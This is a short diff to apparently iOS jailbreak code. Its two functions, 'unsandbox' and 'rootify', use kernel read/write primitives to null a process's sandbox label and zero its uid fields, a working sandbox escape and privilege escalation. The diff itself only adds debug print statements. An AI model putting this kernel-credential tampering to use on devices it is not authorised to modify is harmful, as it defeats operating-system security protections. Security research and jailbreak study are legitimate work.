@@ -754,9 +754,13 @@ uint64_t unsandbox(pid_t pid) {
     printf("[*] Unsandboxing pid %d\n", pid);
     
     uint64_t proc = proc_of_pid(pid); // pid's proccess structure on the kernel
+    printf("[i] Our proc in memory: 0x%llx", proc);
     uint64_t ucred = KernelRead_64bits(proc + off_p_ucred); // pid credentials
+    printf("[i] Our ucreds: 0x%llx", ucred);
     uint64_t cr_label = KernelRead_64bits(ucred + off_ucred_cr_label); // MAC label
+    printf("[i] cr_label: 0x%llx", cr_label);
     uint64_t orig_sb = KernelRead_64bits(cr_label + off_sandbox_slot);
+    printf("[i] sandbox_slot: 0x%llx", orig_sb);
     
     KernelWrite_64bits(cr_label + off_sandbox_slot /* First slot is AMFI's. so, this is second? */, 0); //get rid of sandbox by nullifying it
     
@@ -791,7 +795,9 @@ BOOL rootify(pid_t pid) {
     if (!pid) return NO;
     
     uint64_t proc = proc_of_pid(pid);
+    printf("[i] Our proc in memory: 0x%llx", proc);
     uint64_t ucred = KernelRead_64bits(proc + off_p_ucred);
+    printf("[i] ucred: 0x%llx", ucred);
     //make everything 0 without setuid(0), pretty straightforward.
     KernelWrite_32bits(proc + off_p_uid, 0);
     KernelWrite_32bits(proc + off_p_ruid, 0);
